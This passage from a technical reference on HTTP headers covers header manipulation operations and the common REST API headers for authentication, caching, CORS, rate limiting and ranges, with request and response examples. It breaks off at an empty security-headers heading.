**Order preservation** [Inference: typically maintains headers from the first collection before headers from the second collection], though specific behavior varies by implementation. For headers where order matters, understanding the merge sequence is critical.

**Selective merging** processes only specific headers rather than the entire collection. Pattern: merge only authentication headers, or merge everything except certain restricted headers. This requires filtering logic before or during the merge operation.

**Multi-source merging** combines more than two header collections, common in middleware pipelines where each layer contributes headers. Performing merges sequentially (merge A and B, then merge result with C) or in parallel (merge A, B, and C simultaneously with priority rules) produces different results when conflicts exist.

### Normalizing Headers

Header normalization transforms headers into canonical formats, improving consistency, compatibility, and processing reliability.

**Case normalization** converts header names to standard casing. HTTP/2 mandates lowercase header names, while HTTP/1.1 traditionally used title case (Content-Type, Accept-Encoding). Normalizing to lowercase ensures compatibility across protocol versions and simplifies case-insensitive comparison.

**Value trimming** removes leading and trailing whitespace from header values. The HTTP specification allows whitespace around header values but treats it as insignificant. Trimming prevents issues where " application/json" doesn't match "application/json" in string comparisons.

**Charset conversion** [Unverified: needed only when dealing with legacy systems or non-ASCII header values] transforms character encodings. Modern systems use UTF-8 or ASCII exclusively, but interfacing with older systems may require conversion.

**Format standardization** converts equivalent representations to canonical forms. Example: consolidating multiple Accept headers with different formats into a single comma-separated header with sorted quality values. Or normalizing date formats to RFC 7231's IMF-fixdate format.

**Duplicate elimination** removes redundant header instances with identical values. If the same header appears multiple times with the same value, normalization can reduce it to a single instance without changing semantics.

### Validating Headers

Header validation ensures headers conform to specifications, preventing malformed requests/responses that might cause parsing errors or security issues.

**Name validation** checks that header names contain only legal characters (letters, numbers, hyphens) and don't start with hyphens. Invalid characters like spaces, colons outside the name-value delimiter, or control characters indicate malformed headers. Overly long header names may indicate attacks or bugs.

**Value validation** depends on specific header semantics. Content-Length must be a non-negative integer. Content-Type must match media type format. Date headers require valid RFC 7231 date formats. Custom validation rules apply to application-specific headers.

**Required header checking** ensures mandatory headers are present. HTTP/1.1 requires Host. POST/PUT requests typically require Content-Type and Content-Length or Transfer-Encoding. Missing required headers should fail fast with clear error messages.

**Security validation** detects malicious patterns. Header injection attacks include newline characters (CRLF) attempting to inject additional headers. Excessively long header values may indicate buffer overflow attempts. Suspicious patterns in User-Agent or Referer might indicate attacks.

**Constraint enforcement** validates headers against configured limits: maximum header name length, maximum header value length, maximum total header size, maximum header count. Exceeding these limits typically results in 431 Request Header Fields Too Large responses.

### Serializing Headers

Header serialization converts header collections to wire format or intermediate representations for transmission, storage, or debugging.

**HTTP/1.1 serialization** formats each header as "name: value\r\n" with colon-space delimiter and CRLF line endings. Multiple headers with the same name appear as separate lines. The header section ends with an additional CRLF. Example:

```
Content-Type: application/json\r\n
Authorization: Bearer abc123\r\n
Accept: */*\r\n
\r\n
```

**HTTP/2 serialization** uses HPACK compression encoding header name-value pairs as binary frames. Header names must be lowercase. Static and dynamic tables enable compression by referencing previously transmitted headers by index rather than repeating values. Huffman coding further compresses string values.

**Canonicalization** creates consistent string representations for hashing or signing. AWS Signature Version 4 canonicalization: sorts headers alphabetically by name (lowercase), trims values, concatenates headers as "name:value\n", separates signed header names with semicolons. This ensures identical signatures for equivalent header sets regardless of original ordering or spacing.

**Pretty printing** formats headers for human consumption in logs or debugging output. Includes alignment, syntax highlighting, value truncation for long strings, and sorting for easier scanning. Example:

```
Accept:          application/json
Authorization:   Bearer abc...xyz (truncated)
Content-Length:  1234
Content-Type:    application/json; charset=utf-8
```

**JSON serialization** converts headers to JSON objects or arrays for storage or API transmission. Single-value headers become simple properties, while multi-value headers become arrays. Example: `{"Content-Type": "application/json", "Accept": ["text/html", "application/json"]}`.

### Parsing Headers

Header parsing converts raw text or binary data into structured header collections, handling format variations and malformed input.

**Line splitting** for HTTP/1.1 separates the header section into individual header lines by splitting on CRLF. Line folding (obsolete in modern specs) requires special handling where headers span multiple lines with continuation lines starting with whitespace.

**Name-value separation** splits each line at the first colon, with everything before being the header name and everything after (excluding leading whitespace) being the value. Edge cases include colons in header values (common in timestamps, URLs) which should not trigger additional splits.

**HPACK decoding** for HTTP/2 reverses the compression process. The decoder maintains static and dynamic tables, resolves indexed headers, and reconstructs literal headers using Huffman decoding when applicable. Implementations must track dynamic table size limits and handle table updates correctly.

**Multi-value handling** decides whether to store multiple instances of the same header as separate entries or combine them into comma-separated values. The correct approach depends on the specific header—Set-Cookie must remain separate, while most others can be combined.

**Error recovery** determines behavior when encountering malformed headers. Strict parsers reject the entire message. Lenient parsers skip invalid headers and continue processing. Production systems often favor leniency to handle real-world implementation variations, while security-critical applications favor strictness.

**Encoding detection** [Inference: relevant primarily for legacy compatibility] identifies character encoding in header values. Modern protocols use UTF-8 or ASCII exclusively, but parsing legacy messages may require detecting and converting other encodings.

### Copying Headers Between Contexts

Header copying transfers headers from one message to another, essential for proxying, retries, and request transformation.

**Selective copying** transfers only specific headers rather than all headers. Proxies typically copy most headers but may add, remove, or modify certain ones. Patterns include copying all except a blacklist, copying only a whitelist, or copying with transformation rules.

**Header transformation during copying** modifies values while transferring. Examples: appending to Via or Forwarded headers, updating Host for the new target, stripping sensitive authentication headers, or adding trace context. Transformations may be simple string replacements or complex parsing and reconstruction.

**Connection-specific header handling** requires special treatment. Connection, Keep-Alive, Transfer-Encoding, and Upgrade headers relate to the specific connection rather than the message semantics. Proxies must not forward these headers unchanged, instead handling them based on the connection with the next hop.

**Metadata preservation** maintains header ordering, casing, or comments when copying. While HTTP treats headers case-insensitively and order-independent (mostly), preserving original characteristics may aid debugging or maintain compatibility with quirky implementations.

### Conditional Header Operations

Conditional operations modify headers based on predicates, enabling flexible header management without excessive explicit checks.

**Set-if-absent patterns** add headers only when they don't already exist, providing defaults without overwriting explicit values. Useful for adding Content-Type or User-Agent when applications don't specify them. Implementation typically checks existence before setting, though some APIs provide atomic setDefault or setIfAbsent methods.

**Replace-if-present patterns** modify existing headers without adding new ones. Useful for updating values while leaving unset headers alone. Applications might use this to update expiration times in existing Cache-Control headers without adding Cache-Control to responses that didn't have it.

**Transform-existing patterns** apply functions to current header values, useful for incrementing counters, appending to lists, or modifying substrings. Example: appending a proxy identifier to Via headers, or adding charset to Content-Type if absent.

**Predicate-based operations** apply header modifications only when conditions are met. Predicates might check request method, URL patterns, existing header values, or external state. Middleware stacks commonly use predicates to selectively apply transformations.

### Batch Operations

Batch operations modify multiple headers atomically or efficiently, reducing overhead when making many changes.

**Bulk setting** accepts multiple name-value pairs simultaneously, useful for initializing headers from configuration or copying filtered subsets. Some implementations optimize bulk operations by pre-allocating storage or batching updates.

**Bulk deletion** removes multiple headers in one call, accepting arrays of header names or predicates identifying headers to delete. Efficient for clearing entire categories like removing all custom X- prefixed headers.

**Transactional updates** [Inference: not commonly available in standard HTTP APIs but useful in some contexts] apply multiple modifications atomically—either all succeed or all fail. This prevents partial updates if validation or constraints fail midway through a batch.

**Chaining operations** return the header collection or containing object from each method, enabling fluent interfaces: `headers.set('Content-Type', 'application/json').set('Accept', '*/*').delete('X-Debug')`. This style reduces verbosity and improves readability for sequential modifications.

### Type-Specific Convenience Methods

Many implementations provide specialized methods for common headers with complex formats, abstracting away format details.

**Content-Type helpers** parse and construct Content-Type headers including media type and parameters. Methods extract the media type (`application/json`), charset parameter, or boundary parameter without manual parsing. Setting methods accept media type and optional charset, formatting the complete header value correctly.

**Accept headers processing** parse quality values and media type ranges, returning sorted lists by preference. Methods determine best matching media type from available options, implementing content negotiation algorithms without applications needing to parse q-values manually.

**Cache-Control directives** provide structured access to cache directives like max-age, no-cache, and private. Methods get/set individual directives without parsing the complete comma-separated directive list. Setting methods properly format the entire Cache-Control value from structured inputs.

**Cookie handling** parses Set-Cookie or Cookie headers into structured objects with name, value, and attributes (domain, path, expiration, secure, httpOnly, sameSite). Setting methods construct properly formatted cookie headers from objects, handling encoding and attribute formatting.

**Date header parsing** converts date strings to timestamp objects and vice versa, supporting RFC 7231 IMF-fixdate, obsolete RFC 850, and ANSI C asctime formats. Methods handle timezone conversion and validation without applications dealing with format variations.

**Authorization parsing** extracts authentication schemes and credentials from Authorization headers. Methods identify the scheme (Bearer, Basic, Digest) and extract tokens or decode credentials without manual string manipulation.

### Header Compression and Size Management

Managing header sizes optimizes bandwidth usage and avoids size limits imposed by servers and proxies.

**Redundant header elimination** removes headers that duplicate information available elsewhere or that add no value. Example: removing Accept: _/_ since it's the default, or omitting User-Agent if the server doesn't need it.

**Value abbreviation** shortens header values when full precision isn't necessary. Example: reducing Accept-Language to just the primary language, or using shorter aliases for custom header values. [Inference: This must be done carefully to avoid losing information needed by the server.]

**Header name efficiency** favors shorter standard headers over verbose custom headers when possible. Using standard headers additionally benefits from compression in HTTP/2 where common headers have static table entries.

**Compression-aware ordering** [Inference: relevant for HTTP/2 HPACK] places frequently used headers first so they enter the dynamic table early, maximizing compression efficiency for subsequent requests. Static table headers compress better than dynamic table headers, which compress better than literal headers.

**Size monitoring** tracks total header size to prevent exceeding limits. Servers typically limit total request header size to 4KB-8KB. Monitoring enables graceful degradation by removing optional headers or abbreviating values when approaching limits.

---

## Headers in REST APIs

### Core HTTP Headers

**Content-Type** Specifies the media type of the request or response body. Informs the recipient how to parse and interpret the payload.

Request example:

```
POST /users
Content-Type: application/json

{"name": "Alice", "email": "alice@example.com"}
```

Response example:

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"id": 123, "name": "Alice"}
```

Common values:

- `application/json` - JSON data (most common in REST APIs)
- `application/xml` - XML data
- `text/html` - HTML documents
- `text/plain` - Plain text
- `application/x-www-form-urlencoded` - Form data
- `multipart/form-data` - File uploads with form data
- `application/octet-stream` - Binary data
- `image/jpeg`, `image/png`, `video/mp4` - Media files

The charset parameter specifies character encoding, typically UTF-8.

**Content-Length** Indicates the size of the request or response body in bytes.

```
POST /upload
Content-Type: application/octet-stream
Content-Length: 2048576

[binary data]
```

Servers and clients use Content-Length to:

- Allocate appropriate buffers
- Detect incomplete transmissions
- Display upload/download progress
- Validate payload completeness

HTTP/1.1 requires Content-Length for messages with bodies unless using chunked transfer encoding.

**Accept** Clients specify acceptable response media types. Servers select the best match or return 406 Not Acceptable if unable to satisfy.

```
GET /users/123
Accept: application/json, application/xml;q=0.9, */*;q=0.8
```

Quality values (q parameter) range from 0 to 1:

- 1.0 (default when omitted): Highest preference
- 0.9: Slightly less preferred
- 0.1: Minimally acceptable
- 0: Not acceptable (equivalent to omitting)

Servers examine Accept headers and respond with the best matching format:

```
HTTP/1.1 200 OK
Content-Type: application/json

{"id": 123, "name": "Alice"}
```

**Accept-Language** Specifies preferred natural languages for the response.

```
GET /articles/456
Accept-Language: en-US, en;q=0.9, es;q=0.8
```

Prefers US English, then any English, then Spanish. Servers return content in the best available language:

```
HTTP/1.1 200 OK
Content-Language: en-US

{"title": "Getting Started", "content": "..."}
```

**Accept-Encoding** Indicates acceptable content compression algorithms.

```
GET /large-dataset
Accept-Encoding: gzip, deflate, br
```

- `gzip`: Common, well-supported compression
- `deflate`: Less common compression
- `br` (Brotli): Modern, efficient compression
- `identity`: No compression (often implicit)

Servers compress responses when appropriate:

```
HTTP/1.1 200 OK
Content-Encoding: gzip
Content-Type: application/json
Content-Length: 1247

[compressed data]
```

Compression reduces bandwidth significantly for text-based formats. JSON, XML, and HTML often compress to 10-20% of original size.

**Accept-Charset** Specifies acceptable character encodings. Declining in relevance as UTF-8 becomes universal.

```
Accept-Charset: utf-8, iso-8859-1;q=0.7
```

Most modern APIs assume UTF-8 and ignore this header.

### Authentication and Authorization Headers

**Authorization** Carries credentials for authenticating the client to the server.

**Bearer Token Authentication:**

```
GET /protected/resource
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U
```

Most common for API authentication. Tokens may be opaque identifiers or self-contained JWTs.

**Basic Authentication:**

```
GET /api/data
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
```

Base64-encoded `username:password`. Simple but requires HTTPS—encoding is not encryption.

**API Key Authentication:**

```
GET /api/data
Authorization: ApiKey sk_live_abc123def456
```

Custom schemes vary by implementation. Some APIs use `Authorization: Bearer` for API keys.

**Digest Authentication:**

```
Authorization: Digest username="user", realm="api@example.com", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093", uri="/api/data", response="6629fae49393a05397450978507c4ef1"
```

More secure than Basic but complex. Rarely used in modern APIs.

**Custom API Key Headers:** Some APIs use custom headers instead of Authorization:

```
GET /api/data
X-API-Key: sk_live_abc123def456
API-Key: sk_live_abc123def456
```

Custom headers are less standard but sometimes preferred for specific use cases.

**WWW-Authenticate** Servers use this to challenge clients for authentication when Authorization is missing or invalid:

```
GET /protected/resource

HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="api", error="invalid_token", error_description="Token expired"
```

Indicates authentication scheme and required parameters. Clients respond with appropriate Authorization header.

**Proxy-Authorization and Proxy-Authenticate** Similar to Authorization/WWW-Authenticate but for proxy server authentication:

```
GET /api/data
Proxy-Authorization: Basic cHJveHl1c2VyOnBhc3M=
```

Used when requests pass through authenticating proxies.

### Caching Headers

**Cache-Control** Primary mechanism for controlling caching behavior in requests and responses.

**Response directives:**

```
Cache-Control: public, max-age=3600, must-revalidate
```

- `public`: Any cache (browser, CDN, proxy) can store the response
- `private`: Only client-specific caches (browser) can store, not shared caches
- `no-cache`: Must revalidate with origin server before using cached copy
- `no-store`: Must not store the response anywhere, even temporarily
- `max-age=seconds`: Response is fresh for specified duration
- `s-maxage=seconds`: Like max-age but only for shared caches (CDN, proxies)
- `must-revalidate`: Stale responses must not be served without revalidation
- `proxy-revalidate`: Like must-revalidate but only for shared caches
- `immutable`: Response will never change during freshness lifetime
- `no-transform`: Intermediaries must not modify the response

**Request directives:**

```
GET /api/data
Cache-Control: no-cache, no-store
```

- `no-cache`: Client wants fresh response, not cached copy
- `no-store`: Client demands no caching anywhere
- `max-age=seconds`: Client accepts cached responses up to this age
- `max-stale=seconds`: Client accepts stale responses within this staleness period
- `min-fresh=seconds`: Client wants responses fresh for at least this duration
- `only-if-cached`: Client wants cached responses only, no network request

**Combining directives:**

```
Cache-Control: public, max-age=86400, s-maxage=31536000, immutable
```

Browser caches for 24 hours, CDNs cache for 1 year, response never changes.

**ETag** Entity tag uniquely identifies a specific version of a resource. Enables efficient caching and concurrency control.

**Strong ETag:**

```
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"
```

Byte-for-byte identical resources have identical strong ETags. Any change produces a different ETag.

**Weak ETag:**

```
ETag: W/"0815"
```

Prefix `W/` indicates semantic equivalence rather than byte-identical. Minor changes (formatting, whitespace, comments) don't change weak ETags.

**Conditional requests with ETags:**

Client retrieves resource:

```
GET /api/users/123

HTTP/1.1 200 OK
ETag: "v42"
Cache-Control: max-age=300

{"id": 123, "name": "Alice"}
```

Later, client validates cache:

```
GET /api/users/123
If-None-Match: "v42"

HTTP/1.1 304 Not Modified
ETag: "v42"
Cache-Control: max-age=300
```

No body returned—client uses cached copy.

If resource changed:

```
GET /api/users/123
If-None-Match: "v42"

HTTP/1.1 200 OK
ETag: "v43"

{"id": 123, "name": "Alice Updated"}
```

**If-Match (Precondition for Updates):**

```
PUT /api/users/123
If-Match: "v42"
Content-Type: application/json

{"id": 123, "name": "Alice Modified"}
```

Succeeds only if current ETag is "v42":

```
HTTP/1.1 200 OK
ETag: "v43"

{"id": 123, "name": "Alice Modified", "updated_at": "2024-12-16T12:00:00Z"}
```

If resource changed (different ETag):

```
HTTP/1.1 412 Precondition Failed
ETag: "v43"

{"error": "Resource was modified by another client"}
```

**If-None-Match (Conditional GET and PUT):** For GET, returns 304 if ETag matches (described above).

For PUT, creates only if resource doesn't exist:

```
PUT /api/users/456
If-None-Match: *
Content-Type: application/json

{"name": "Bob"}

HTTP/1.1 201 Created
Location: /api/users/456
ETag: "v1"
```

If resource exists:

```
HTTP/1.1 412 Precondition Failed
ETag: "v5"

{"error": "Resource already exists"}
```

**Last-Modified and If-Modified-Since** Timestamp-based alternative to ETags.

```
GET /api/articles/789

HTTP/1.1 200 OK
Last-Modified: Wed, 15 Dec 2024 10:00:00 GMT
Cache-Control: max-age=3600

{"title": "Article Title", "content": "..."}
```

Conditional request:

```
GET /api/articles/789
If-Modified-Since: Wed, 15 Dec 2024 10:00:00 GMT

HTTP/1.1 304 Not Modified
Last-Modified: Wed, 15 Dec 2024 10:00:00 GMT
```

**If-Unmodified-Since:** Update only if not modified since specified time:

```
PUT /api/articles/789
If-Unmodified-Since: Wed, 15 Dec 2024 10:00:00 GMT
Content-Type: application/json

{"title": "Updated Title"}

HTTP/1.1 412 Precondition Failed
Last-Modified: Wed, 15 Dec 2024 11:30:00 GMT
```

**Expires** Legacy caching mechanism specifying absolute expiration time.

```
Expires: Thu, 16 Dec 2025 12:00:00 GMT
```

Cache-Control max-age takes precedence when both are present. Expires remains for HTTP/1.0 compatibility.

**Vary** Indicates which request headers affect the response content. Caches must store separate entries for different values of these headers.

```
HTTP/1.1 200 OK
Content-Type: application/json
Vary: Accept-Encoding, Accept-Language

{"message": "Hello"}
```

Cache stores separate entries for different combinations of Accept-Encoding and Accept-Language values.

Without Vary, caches might serve gzipped content to clients that don't support compression, or English content to clients requesting Spanish.

**Age** Indicates how long the response has been in cache (in seconds).

```
HTTP/1.1 200 OK
Cache-Control: max-age=3600
Age: 1200

{"data": "cached content"}
```

Response is 1200 seconds old, fresh for another 2400 seconds (3600 - 1200).

### Request Context Headers

**User-Agent** Identifies the client making the request—browser, mobile app, bot, or custom application.

```
GET /api/data
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

Servers use User-Agent to:

- Provide client-appropriate responses
- Track API usage by client type
- Block malicious bots
- Gather analytics

APIs should document expected User-Agent format for custom clients:

```
User-Agent: MyApp/2.1.0 (iOS 15.0)
User-Agent: MyCompany-Bot/1.0 (+https://example.com/bot-info)
```

**Referer** Indicates the URL of the page that linked to the current request.

```
GET /api/widget-data
Referer: https://example.com/dashboard
```

Note the misspelling (should be "Referrer") persists in HTTP specifications.

Servers use Referer for:

- Analytics and tracking referral sources
- Security checks (validating requests come from expected origins)
- CSRF protection (though inadequate alone)

Privacy concerns and browser policies increasingly restrict or omit Referer. Never rely solely on Referer for security decisions.

**Referrer-Policy** Controls how much referrer information is included in requests:

```
Referrer-Policy: no-referrer
Referrer-Policy: origin
Referrer-Policy: strict-origin-when-cross-origin
```

- `no-referrer`: Never send Referer header
- `origin`: Send only origin (scheme, host, port), not full URL
- `same-origin`: Send full URL for same-origin, omit for cross-origin
- `strict-origin-when-cross-origin`: Full URL for same-origin, only origin for cross-origin HTTPS, nothing for HTTPS→HTTP

**Host** Specifies the host and port of the target server. Required in HTTP/1.1.

```
GET /api/users
Host: api.example.com
```

Enables virtual hosting—multiple domains on single IP address. Servers use Host to route requests to appropriate applications.

HTTP/2 uses the `:authority` pseudo-header instead of Host.

**Origin** Indicates the origin (scheme, host, port) of the request. Critical for CORS.

```
POST /api/data
Origin: https://app.example.com
Content-Type: application/json

{"key": "value"}
```

Browsers automatically include Origin for cross-origin requests. Servers check Origin against allowlists and respond with appropriate CORS headers.

### Response Context Headers

**Location** Provides the URI of a resource, used in several contexts:

**Resource creation (201 Created):**

```
POST /users

HTTP/1.1 201 Created
Location: /users/789
Content-Type: application/json

{"id": 789, "name": "Charlie"}
```

**Redirection (3xx status codes):**

```
GET /old-path

HTTP/1.1 301 Moved Permanently
Location: /new-path
```

**Asynchronous operation status:**

```
POST /heavy-operation

HTTP/1.1 202 Accepted
Location: /operations/abc123

{"operation_id": "abc123", "status": "pending"}
```

**Allow** Lists HTTP methods supported by the resource. Included in 405 Method Not Allowed responses and OPTIONS responses.

```
DELETE /api/public-info

HTTP/1.1 405 Method Not Allowed
Allow: GET, HEAD, OPTIONS

{"error": "DELETE not permitted on this resource"}
```

**OPTIONS request:**

```
OPTIONS /api/users/123

HTTP/1.1 200 OK
Allow: GET, PUT, PATCH, DELETE, HEAD, OPTIONS
```

**Server** Identifies the server software handling the request.

```
HTTP/1.1 200 OK
Server: nginx/1.21.0
```

Often omitted or obscured for security reasons—exposing server versions aids attackers in identifying vulnerabilities. Many deployments customize or remove this header.

**Retry-After** Indicates when the client should retry after rate limiting or temporary unavailability.

**Seconds:**

```
HTTP/1.1 429 Too Many Requests
Retry-After: 3600

{"error": "Rate limit exceeded"}
```

Client should wait 3600 seconds (1 hour) before retrying.

**HTTP Date:**

```
HTTP/1.1 503 Service Unavailable
Retry-After: Wed, 16 Dec 2024 14:00:00 GMT

{"error": "Maintenance in progress"}
```

Client should retry after the specified time.

**Date** Timestamp when the response was generated.

```
HTTP/1.1 200 OK
Date: Wed, 16 Dec 2024 12:30:00 GMT
```

Used for cache calculations, age determination, and logging. Required in HTTP/1.1 responses (except in specific error conditions).

### Rate Limiting Headers

APIs use various header naming conventions for rate limiting. No single standard exists, though patterns have emerged.

**Common Pattern (X-RateLimit-*):**

```
HTTP/1.1 200 OK
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 247
X-RateLimit-Reset: 1702732800

{"data": "response content"}
```

- `X-RateLimit-Limit`: Maximum requests allowed in the time window
- `X-RateLimit-Remaining`: Requests remaining in current window
- `X-RateLimit-Reset`: Unix timestamp when the window resets

**Alternative Naming (RateLimit-*):**

```
RateLimit-Limit: 1000
RateLimit-Remaining: 247
RateLimit-Reset: 1702732800
```

Drops the `X-` prefix, which was historically used for custom headers.

**GitHub Style:**

```
X-RateLimit-Limit: 5000
X-RateLimit-Remaining: 4987
X-RateLimit-Reset: 1702732800
X-RateLimit-Used: 13
```

Adds `X-RateLimit-Used` showing consumed requests.

**Twitter Style:**

```
X-Rate-Limit-Limit: 900
X-Rate-Limit-Remaining: 847
X-Rate-Limit-Reset: 1702732800
```

Uses hyphens instead of camel case.

**When Limit Exceeded:**

```
HTTP/1.1 429 Too Many Requests
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1702732800
Retry-After: 3600

{"error": "Rate limit exceeded", "message": "Try again in 1 hour"}
```

Combines rate limit headers with Retry-After for clear guidance.

**Per-Resource Rate Limits:** Different endpoints may have different limits:

```
GET /api/search

HTTP/1.1 200 OK
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 73
X-RateLimit-Reset: 1702732800
X-RateLimit-Resource: search
```

`X-RateLimit-Resource` or similar identifies which limit applies.

**Multiple Limit Types:**

```
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 247
X-RateLimit-Reset: 1702732800
X-RateLimit-Minute-Limit: 100
X-RateLimit-Minute-Remaining: 47
X-RateLimit-Minute-Reset: 1702729260
```

Tracks both hourly and per-minute limits simultaneously.

### CORS Headers

**Access-Control-Allow-Origin** Specifies which origins can access the resource.

**Specific origin:**

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
```

Only `https://app.example.com` can access this resource.

**Wildcard (any origin):**

```
Access-Control-Allow-Origin: *
```

Any origin can access. Cannot be used with credentials (cookies, authorization headers).

**Dynamic origin (reflection):** Server reflects the request Origin:

```
GET /api/data
Origin: https://trusted.example.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://trusted.example.com
```

[Unverified] Servers should validate Origin against an allowlist before reflecting—blindly reflecting Origin creates security vulnerabilities.

**Access-Control-Allow-Methods** Lists HTTP methods allowed for cross-origin requests.

```
HTTP/1.1 200 OK
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
```

Responds to preflight OPTIONS requests indicating which methods the actual request may use.

**Access-Control-Allow-Headers** Specifies which request headers the client can send.

```
HTTP/1.1 200 OK
Access-Control-Allow-Headers: Content-Type, Authorization, X-Custom-Header
```

Browsers send preflight requests when using non-simple headers. Simple headers (Accept, Accept-Language, Content-Language, Content-Type with specific values) don't require explicit permission.

**Access-Control-Expose-Headers** Lists response headers that JavaScript can access.

```
HTTP/1.1 200 OK
Access-Control-Expose-Headers: X-Total-Count, X-Page-Number, ETag
X-Total-Count: 1543
X-Page-Number: 1
ETag: "v42"
```

By default, JavaScript can only access simple response headers (Cache-Control, Content-Language, Content-Type, Expires, Last-Modified, Pragma). Custom headers require explicit exposure.

**Access-Control-Allow-Credentials** Indicates whether the response can be exposed when credentials are included.

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

Enables cookies, authorization headers, and TLS client certificates in cross-origin requests. Requires specific origin (cannot use wildcard).

**Access-Control-Max-Age** Specifies how long preflight responses can be cached.

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Max-Age: 86400
```

Browsers cache preflight responses for 86400 seconds (24 hours), reducing preflight overhead.

**Preflight Request Example:**

```
OPTIONS /api/users
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 3600
```

After successful preflight, actual request proceeds:

```
POST /api/users
Origin: https://app.example.com
Authorization: Bearer token123
Content-Type: application/json

{"name": "Diana"}

HTTP/1.1 201 Created
Access-Control-Allow-Origin: https://app.example.com
Location: /api/users/890
```

### Range and Content-Range Headers

**Range (Request)** Requests specific byte ranges of a resource.

**Single range:**

```
GET /files/video.mp4
Range: bytes=0-1023
```

Requests first 1024 bytes (bytes 0-1023 inclusive).

**Multiple ranges:**

```
GET /files/document.pdf
Range: bytes=0-499, 1000-1499, 5000-5999
```

Requests three separate byte ranges.

**Open-ended range:**

```
Range: bytes=1000-
```

Requests from byte 1000 to end of file.

```
Range: bytes=-500
```

Requests last 500 bytes.

**Content-Range (Response)** Indicates which portion of the resource is being returned.

**Single range response:**

```
GET /files/video.mp4
Range: bytes=0-1023

HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/10485760
Content-Length: 1024
Content-Type: video/mp4

[1024 bytes of data]
```

`0-1023/10485760` means bytes 0-1023 of a 10MB file.

**Unsatisfiable range:**

```
GET /files/small.txt
Range: bytes=1000-2000

HTTP/1.1 416 Range Not Satisfiable
Content-Range: bytes */543

{"error": "Requested range exceeds file size"}
```

File is only 543 bytes; cannot satisfy request for bytes 1000-2000.

**Accept-Ranges** Indicates whether the server supports range requests.

```
HEAD /files/video.mp4

HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 10485760
```

Server supports byte range requests.

```
Accept-Ranges: none
```

Server does not support range requests.

**Multipart Range Response:** When multiple ranges are requested, the response uses multipart format:

```
GET /files/document.pdf
Range: bytes=0-99, 500-599

HTTP/1.1 206 Partial Content
Content-Type: multipart/byteranges; boundary=BOUNDARY
Content-Length: 346

--BOUNDARY
Content-Type: application/pdf
Content-Range: bytes 0-99/5000

[100 bytes]
--BOUNDARY
Content-Type: application/pdf
Content-Range: bytes 500-599/5000

[100 bytes]
--BOUNDARY--
```

### Custom and Extension Headers

**X- Prefix (Deprecated)** Historically, custom headers used `X-` prefix:

```
X-Request-ID: abc-123-def-456
X-API-Version: 2
X-Custom-Auth: special-token
```

RFC 6648 deprecated this convention. Modern practice uses clear, descriptive names without `X-`:

```
Request-ID: abc-123-def-456
API-Version: 2
```

Many APIs still use `X-` prefix due to legacy or convention.

**Request-ID / X-Request-ID** Unique identifier for tracking requests through distributed systems.

```
POST /api/orders
Request-ID: 550e8400-e29b-41d4-a716-446655440000

HTTP/1.1 201 Created
Request-ID: 550e8400-e29b-41d4-a716-446655440000
```

Server echoes the Request-ID or generates one if not provided. Enables correlation across logs, traces, and systems.

**Idempotency-Key** Enables idempotent POST requests:

```
POST /payments
Idempotency-Key: 7f3d5c9e-8b4a-4e7f-9c2d-1a6b8e4f3c9d
Content-Type: application/json

{"amount": 100.00, "currency": "USD"}

HTTP/1.1 201 Created
Idempotency-Key: 7f3d5c9e-8b4a-4e7f-9c2d-1a6b8e4f3c9d
```

Repeated requests with the same key return the original response without re-processing.

**API-Version / X-API-Version** Specifies API version via header instead of URI:

```
GET /users/123
API-Version: 2024-12-01

HTTP/1.1 200 OK
API-Version: 2024-12-01
```

Alternative to `/v1/users/123` URI versioning.

**X-Total-Count** Common in paginated responses, indicates total number of items:

```
GET /users?page=1&per_page=20

HTTP/1.1 200 OK
X-Total-Count: 1543
Content-Type: application/json

[{...}, {...}, ...]
```

Clients use this to calculate total pages and display pagination controls.

**Link (RFC 8288)** Provides relationship-based links, particularly useful for pagination:

```
GET /articles?page=2&per_page=50

HTTP/1.1 200 OK
Link: </articles?page=1&per_page=50>; rel="prev",
      </articles?page=3&per_page=50>; rel="next",
      </articles?page=1&per_page=50>; rel="first",
      </articles?page=20&per_page=50>; rel="last"
```

Relationships (`rel` parameter):

- `next`: Next page
- `prev`/`previous`: Previous page
- `first`: First page
- `last`: Last page
- `self`: Current resource
- `alternate`: Alternative representation

**X-Forwarded-For** Identifies originating IP address when requests pass through proxies or load balancers:

```
X-Forwarded-For: 203.0.113.45, 198.51.100.17
```

First IP is original client, subsequent IPs are intermediaries. [Inference] Servers should validate and sanitize this header as clients can forge it—trust only entries added by controlled infrastructure.

**X-Forwarded-Proto** Indicates the original protocol (HTTP or HTTPS) before proxies:

```
X-Forwarded-Proto: https
```

Servers behind load balancers use this to determine if the original request was secure.

**X-Forwarded-Host** Original Host header before proxies modified it:

```
X-Forwarded-Host: api.example.com
```

**Forwarded (RFC 7239)** Standardized replacement for X-Forwarded-* headers:

```
Forwarded: for=203.0.113.45; proto=https; host=api.example.com
```

More structured and standardized but less widely adopted than X-Forwarded-* variants.

### Security Headers

